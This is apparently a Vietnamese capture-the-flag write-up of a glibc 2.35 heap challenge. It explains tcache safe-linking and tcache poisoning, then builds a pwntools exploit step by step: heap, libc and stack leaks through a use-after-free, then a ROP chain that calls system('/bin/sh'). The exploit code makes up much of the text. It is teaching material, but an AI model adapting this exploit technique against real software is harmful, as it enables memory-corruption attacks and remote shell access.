# heap challenge
# TCACHE POINSON

\\\srcipt,chall,libc và linker đều ở trong file src.

vì đây là challenge về heap nên ta đầu tiên ta phải kiểm tra xem là ta đang dùng glibc bản bao nhiêu:

![image](https://user-images.githubusercontent.com/93699926/236653398-ccdbe9a9-6429-4118-b01e-222aea7cf600.png)

Ta được cung cấp file glibc bản 2.35. Ta được biết ở phiên bản LIBC 2.32 trở đi các hook ta thường dùng để khai thác các challenge heap trước kia đều sẽ bị xóa bỏ.
Và từ phiên bản libc 2.32 trở đi thì khi ta free một chunk vô tcache thì trong file sourc của malloc.c có thêm một tính năng bảo vệ mới đó là XOR.
nó sẽ lấy địa chỉ heap(không tính phần metadata) của chunk được free >>12^ với địa chỉ heap của chunk được free trước đó(again địa chỉ heap khong tính phần metadata).

VD : nếu ta free 1 chunk đầu tiên có địa chỉ 0x55555555a2a0 .Vì đây là chunk đầu tiên được free nên nó sẽ lấy 0x55555555a2a0>>12 ^ 0 = 0x000000055555555a.
. thực hiện XỎ với 0 vì không có chunk nào được free trước đó . 

![image](https://user-images.githubusercontent.com/93699926/236653568-901d2521-0e31-4c45-8fc3-4afd578beef8.png)

Ta thấy như trong hình thì địa chỉ foward pointer của chunk đầu tiên ta free được được biến đổi thành `0x000000055555555a`.

chính nhờ tính năng này nên ta sẽ có kỹ thuật tcache poisoning : đơn giản là nếu như ta có 2 chunk là chunk0 và chunk1.
Ta free lần lượt chunk0 và chunk1 : thì trong Tcache bin ta có : chunk1<--chunk0. nếu như ta có thể thay đổi foward ptr của chunk1 thì ta sẽ làm cho chunk0 chỉ đến địa chỉ mà ta mong muốn.
VD nếu ta muốn ghi đề lên __free_hook thì ta sẽ lấy địa chỉ của chunk1>>12 ^ __free_hook . Thì ta sẽ có như sau : chunk1 <-- __free_hook. Và giờ ta chỉ cần malloc 2 chunk có cùng kích thước với tcache thread đang chứa hai hai chunks của ta thì ta sẽ có thể ghi đè lên __free_hook.

OK. vậy bây giờ thì ta hãy cùng pwn cái challenge này :

Kiểm tra các chế độ bảo vệ của chương trình :

![image](https://user-images.githubusercontent.com/93699926/236653809-fd002f9c-7a76-4895-b173-f66e87edb030.png)

chương trình có cho ta file src trong heap.c , kiểm tra file src thì ta phát hiện hai lỗi đó là :

![image](https://user-images.githubusercontent.com/93699926/236653845-bc4ad002-a663-4522-b0be-86ce612a491d.png)

Ở nhánh case0: tương ứng vơi option `0) Allocate a chunk` ta thây chương trình sẽ cho ta malloc với chunk không vượt quá 0x100, và con trỏ chỉ tới hai chunk đó được lưu ở biến global Allocation[2].
Ở đây ta thấy có lỗi đó là nó chỉ check xem size và index của có quá số lượng mà nó đã khai báo với Allocation[2] hay không , tức là ta chỉ có thể có hai còn trỏ trỏ tới heap thôi.
MÀ nó không check xem là tại vị trí con trỏ đó có đang trỏ tới chunk nào không . vậy ta có thể malloc vô số chunk ta muốn, điều này sẽ rất giúp ích việc khai thác.

Và lỗi tiếp theo đó là không set null con trỏ sau khi free --> UAF:

![image](https://user-images.githubusercontent.com/93699926/236653979-c1f484ad-c64b-4ced-9595-160a6e01f2cd.png)

ok vậy để thực hiện kỹ thuât Tache Poisoning , cái ta cần trước hết vẫn là địa chỉ heap , cái cần tiếp theo sẽ là địa chỉ libc, và vì từ glibc.2.32 trở đi ta không thể khai thác thông qua các hook như __free_hook hay __malloc_hook nữa nên ta sẽ phải chuyển qua tấn công saved rip của chương trình.

Vậy kết luận lại , ta có kế hoạch như sau :
```
Step1: leak heap
Step2: leak libc sử dụng unsorted bin
Step3: leak stack sử dụng environ sau khi đã có địa chỉ libc
Step4: Tạo ROPCHAIN ngay tại địa chỉ trả về của hàm nào đó
```

# Step1: Leak heap

để leak heap thì rất dơn giản khi ta có lỗi uaf và lại còn có hàm `2) Print a chunk` nữa. Ta chỉ  cần tạo một chunk sau dó free chunk đó và rồi chọn option2 để là có thể leak được địa chỉ foward pointer của chunk đó. Và như có nói ở trên do chế độ bảo vệ XOR với shift ấy nên ta cũng cần biến đổi một chút để có được địa chỉ heap base:

```python
add(1,0xf8,b"B"*0xf8)
free(0)
view(0)
leak=int.from_bytes(p.recvuntil(b" Allocate",drop=True).split(b"\n")[0],"little")
log.info('[+]leak:'+hex(leak))
heap=leak<<12
log.info('[+]heap base:'+hex(heap))
```

Vậy bây giờ ta đã có heap base để có thể sử dụng kỹ thuật tcache poisoning.

# Step2 : leak libc
Để leak libc thì đơn giản nhất vãn là free chunk vượt quá size của tcache thread , ta cứ free chunk size 0x500 là nó sẽ vô unsorted bin luôn,nhưng vì chương trình chỉ cho ta malloc chunk có kích thước 0x100. Nên ta sẽ sử dụng kỹ thuật để thay đổi foward pointer của của ta chỉ đến một fakechunk có size 0x500.
Và vì sau khi ta free cái chunk có size 0x500 , ta cần tạo một fake chunk nữa ngay liền kề với cái chunk 0x500 mà ta đã tạo ra trước đó, nếu không chương trình sẽ abort với lỗi `malloc():next chunk size`.

Vậy kế hoạch sẽ là tạo ra khoảng 5-7 chunks có kích thước 0x100, với chunk đầu tiên ta sẽ sử dụng để tạo ra fake chunk có size 0x500 và các các chunk sau vì lười tính nên mình sẽ ghi content của chunk đó lặp đi lặp lại với 0 và 0x101. đẻ khi ta free cái fake chunk no sẽ vượt qua cái next chunk size check.

OK vậy ta sẽ sửa script như sau:

```python3
payload=flat(
	0,0,
	0,0x501,
	)
add(0,0xf8,payload) # chunk đầu tiên để tạo ra một fakechunk

for i in range(5):
	add(0,0xf8,payload) # tạo thêm 5 chunks nữa  
add(1,0xf8,b"B"*0xf8) # tạo thêm 1 chunk để sau khi leak heap thì thực hiện kỹ thuật tcache poisoning
free(0) # đoạn này giống ở trên rồi , để leak heap thôi
view(0)
leak=int.from_bytes(p.recvuntil(b" Allocate",drop=True).split(b"\n")[0],"little")
log.info('[+]leak:'+hex(leak))
heap=leak<<12
log.info('[+]heap base:'+hex(heap))
free(1) #  free chunk1 để chuẩn bị thực hiện tấn công
```

![image](https://user-images.githubusercontent.com/93699926/236654526-8cfc34d5-dc23-4cc7-8c2d-c78b2811e34b.png)

Ta đã leak dược dịa chỉ heap base, giờ hãy kiểm tra heap bin và tính toán :

![image](https://user-images.githubusercontent.com/93699926/236654556-65ec3063-3140-4c95-aca7-ecd502a40a6a.png)

ta có chunk1 ở địa chỉ heap base+0x8a0, và fake chunk của ta ở vị trí :

![image](https://user-images.githubusercontent.com/93699926/236654613-e02ff7d5-a9da-4bdd-be5d-d3e9a1d84096.png)
 
 hilight vàng là chunk dầu tiên ta tạo ra , đánh dấu màu đỏ là cái fake chunk size ta tạo ra , vậy bây giờ để sao cho chunk trong tcache bin chỉ đến cái fake chunks của ta thì ta sẽ lấy địa chỉ của chunk1 là :
 (heap base+0x8a0)>>12 ^ địa chỉ của (fakechunk) , địa chỉ không tính phần metadata nha.==> (heap base+0x8a0)>>12 ^ (heap base+0x2c0).
 
 ```python
 payload=p64((heap+0x8a0)>>12^(heap+0x2c0))
edit(1,payload)
```

ta sẽ có như sau :

![image](https://user-images.githubusercontent.com/93699926/236654753-df26b23c-7d53-402a-b2c5-a91160f65953.png)

đó nó trỏ đến chunk có size 0x500 rồi . giờ ta lấy nó ra và free nó một lần nữa thì nó sẽ vô unsorted bin

```python
payload=p64((heap+0x8a0)>>12^(heap+0x2c0))
edit(1,payload)

add(0,248,b"A"*248)
add(0,248,b"A"*248)
free(0)

view(0)
leak=int.from_bytes(p.recvuntil(b" Allocate",drop=True).split(b"\n")[0],"little")
log.info('[+]leak:'+hex(leak))
libc.address=leak-0x219ce0
log.info('[+]libc base:'+hex(libc.address))
```
![image](https://user-images.githubusercontent.com/93699926/236654821-fc4702bd-723a-46d9-8078-e53dcb7da805.png)

leak libc thành công!!!

# Step3: leak stack và tính địa chỉ saved rip của main

thực hiện như trên bươc trên nhưng thay bằng địa chỉ environ-0x10 environ-0x10 là vì sau khi ta malloc ra thì ta cần ghi DATA vô nên thôi cứ -0x10 xong ta điền đủ 0x10 bytes vô rồi nối nó với địa chỉ stack là được,

``` python3 
add(0,0x20,b"A"*0x20)
add(1,0x20,b"A"*0x20)
free(0)
free(1)
payload=p64((heap+0x2f0)>>12^(libc.sym['environ']-0x10))
edit(1,payload)
add(0,0x20,b"A")
add(1,0x20,b"A"*0x10)
view(1)
p.recvuntil(b"A"*0x10)
stack=int.from_bytes(p.recv(6),"little")
log.info("[+]stack leak:"+hex(stack))
menu_rip=stack-0x170
main_rip=stack-0x120# main#rip-8
log.info("[+]menu:"+hex(menu_rip))
log.info("[+]main:"+hex(main_rip))
```
để tính địa chỉ saved rip của main thì cứ đặt break point ngay tại leave ret cuẩ main, xong chọn option 4 rồi lấy nó stack leak-saved_rip_main là ra.

# Step4 là tạo ROPCHAIN

thực hiện kỹ thuật như trên , ta thay đổi foward pointer chỉ đến saved_rip_main-8 để sao cho size của cái chunk đấy = 0 giống như environ ấy không có nó bằng 0x68182812 gì đấy rất to nó lại sinh ra lỗi,
. Và nhớ là lúc tạo chunk để free vô tcache thread thì tạo to một chút để khi malloc lại ta sẽ có đủ size của chunk để tạo ROPCHAIN, lúc đầu mình tạo chunk 0x20 nên không đủ chỗ,lúc sau sửa lại thành hai chunk 0x50 thì thành công pwned cái chall này .
OK đoạn cuối sẽ như sau:

```python3
add(0,0x50,b"A"*0x20)
add(1,0x50,b"A"*0x20)
free(0)
free(1)

payload=p64((heap+0x380)>>12^(main_rip-8))
edit(1,payload)

add(0,0x50,b"A"*0x20)
pop_rdi=libc.address+0x000000000002a3e5
ret=libc.address+0x0000000000029cd6
payload=flat(
	0,
	pop_rdi,next(libc.search(b"/bin/sh")),
	libc.sym['system']
	)
add(1,0x50,b"A"*0x18) # đoạn nay mình chưa tạo ROPCHAIN ngay mà padding đến địa chỉ có chứa exe address để tính exe base rồi thay rbp bằng địa chỉ hượp lệ để tránh lỗi
view(1)# leak exe
p.recvuntil(b"A"*0x18)
leak=int.from_bytes(p.recv(6),"little")
log.info('[+]exe leak:'+hex(leak))
exe.address=leak-0x13a2
rw_section=exe.address+0x5a00
payload=flat(rw_section,pop_rdi,next(libc.search(b"/bin/sh")),ret,libc.sym['system']+5)
edit(1,payload) # bây giờ ta tạo ROPCHAIN
p.sendlineafter(b"[*] choice : ",b"4") # tringer main to return and get shell
```
full script in p.py in src.

chạy chương trình trên sever ta được như sau :

![image](https://user-images.githubusercontent.com/93699926/236655192-fb1d335f-97bd-4e21-87d7-b1f3f4f25c04.png)





